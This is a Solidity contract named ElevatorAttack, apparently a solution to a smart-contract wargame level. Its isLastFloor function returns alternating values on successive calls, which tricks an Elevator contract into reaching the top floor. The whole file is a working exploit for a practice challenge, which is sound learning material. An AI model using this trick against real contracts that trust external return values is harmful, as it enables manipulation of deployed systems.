
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack is Building {

    bool private togle;

    constructor() {
        togle = true;
    }

    function setTop(address _elevatorAddress) external {
        Elevator(_elevatorAddress).goTo(1);
    }

    function isLastFloor(uint) override external returns (bool) {
        togle = !togle;
        return togle;
    }

}
